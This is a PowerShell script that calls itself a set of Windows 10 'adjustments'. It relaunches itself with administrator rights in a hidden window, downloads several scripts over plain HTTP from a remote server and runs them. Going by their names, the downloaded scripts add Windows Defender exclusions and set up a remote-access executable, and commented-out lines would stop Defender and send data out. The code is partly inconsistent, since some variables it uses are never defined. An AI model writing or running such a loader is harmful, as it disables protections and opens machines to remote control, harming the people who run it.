<#
.SYNOPSIS
    This Script Download and Run Some Adjustments
.DESCRIPTION
    This Script Download and Run Some Adjustments
    on Windows 10 Local Computer
.NOTES
    File name: NIT-Win.Adjust.003_1.ps1
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2025-01-28
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2025-01.28) Script created
    1.0.1 - 
#>
param([switch]$Elevated)

#### Set Variables

### Add Global Variables

# Set Powershell File
# $aFile00 = 'echo-server.utf8.wsf.ps1'
$aFile01 = 'nit.new-poshreg.ps1'
# $aFile02 = 'nit.stop-defender.download.ps1'
$aFile03 = 'nit.new-usrexcl.ps1'
$aFile04 = 'nit.new-tinyexcl.ps1'
$aFile05 = 'nit.new-remote.exe.ps1'
$aFile06 = 'nit.new-tinysend.ps1'
$aPureURL = 'http://lin.netip4.ru:18080/~vagrant/PROGS/LIB-RUN/PS1/'

### Set Functions
#

Function Check-DownloadShellFolder() {
    try {
        $DownloadShellFolder=(New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
    }
    catch {
        Write-Host "Download Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "Download Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "Download Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

function Get-MyDocumentsShellFolder() {
    $MyDocuments = 5 #System.Environment.SpecialFolder.MyDocuments
    [System.Environment]::GetFolderPath($MyDocuments)
}

function Get-UserProfileShellFolder() {
    if( !$env:USERPROFILE ) {
        return $null
    }
    else {
        $env:USERPROFILE
    }
}


Function Check-MyDocumentsShellFolder() {
    try {
        $DownloadShellFolder=Get-MyDocumentsShellFolder
    }
    catch {
        Write-Host "My Documents Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "My Documents Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "My Documents Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

Function Check-UserProfileShellFolder() {
    try {
        $DownloadShellFolder=Get-UserProfileShellFolder
    }
    catch {
        Write-Host "User Profile Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "User Profile Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "User Profile  Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

### Set Functions
#

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

## Set System Objects
$wc = New-Object System.Net.WebClient
if( Check-DownloadShellFolder ) {
    $DownloadsDir = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
}
else {
    Write-Host "Check Integrity Error! Download Folder is not Found."
    Exit 1
}

## Set Url and Output
#
# $anUrl00 = $aPureURL + $aFile00
$anOutput00 = Join-Path -Path $DownloadsDir -ChildPath $aFile00
$anUrl01 = $aPureURL + $aFile01
$anOutput01 = Join-Path -Path $DownloadsDir -ChildPath $aFile01  # POSH Adjusting
# $anUrl02 = $aPureURL + $aFile02
# $anOutput02 = Join-Path -Path $DownloadsDir -ChildPath $aFile02 # Stop Defender Adjusting
$anUrl03 = $aPureURL + $aFile03
$anOutput03 = Join-Path -Path $DownloadsDir -ChildPath $aFile03 # User Defender Exclusion
$anUrl04 = $aPureURL + $aFile04
$anOutput04 = Join-Path -Path $DownloadsDir -ChildPath $aFile04 # Tiny Defender Exclusion
$anUrl05 = $aPureURL + $aFile05
$anOutput05 = Join-Path -Path $DownloadsDir -ChildPath $aFile05 # NIT Remote Adjusting
$anUrl06 = $aPureURL + $aFile06
$anOutput06 = Join-Path -Path $DownloadsDir -ChildPath $aFile06 # Tiny Send

Write-Host $anUrl

#if( Test-Path -Path $anOutput00 ) {
#    ri -Path $anOutput00 -Force
#}

if( Test-Path -Path $anOutput01 ) {
    ri -Path $anOutput01 -Force
}

if( Test-Path -Path $anOutput02 ) {
    ri -Path $anOutput02 -Force
}

if( Test-Path -Path $anOutput03 ) {
    ri -Path $anOutput03 -Force
}

if( Test-Path -Path $anOutput04 ) {
    ri -Path $anOutput04 -Force
}

if( Test-Path -Path $anOutput05 ) {
    ri -Path $anOutput05 -Force
}

if( Test-Path -Path $anOutput06 ) {
    ri -Path $anOutput06 -Force
}

# Set Functions

### Run Payloads

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
#        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -Window Normal -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -Window Hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

# 'running with full privileges'

# iex( $wc.DownloadString($anUrl00))
# iex( $wc.DownloadString($anUrl01))
$wc.DownloadFile($anUrl01, $anOutput01) # POSH Adjusting
& $anOutput01
# $wc.DownloadFile($anUrl02, $anOutput02) # Stop Defender
# & $anOutput02
$wc.DownloadFile($anUrl03, $anOutput03) # User Defender Exclusions
& $anOutput03
$wc.DownloadFile($anUrl04, $anOutput04) # Tiny Defender Exclusion
& $anOutput04
$wc.DownloadFile($anUrl05, $anOutput05)  # NIT Remote Adjusting
& $anOutput05
# $wc.DownloadFile($anUrl06, $anOutput06) # TinySend
# & $anOutput06
Write-Host "Script NIT-Win.Adjust.003_1.ps1 is successfully executed"
exit 0
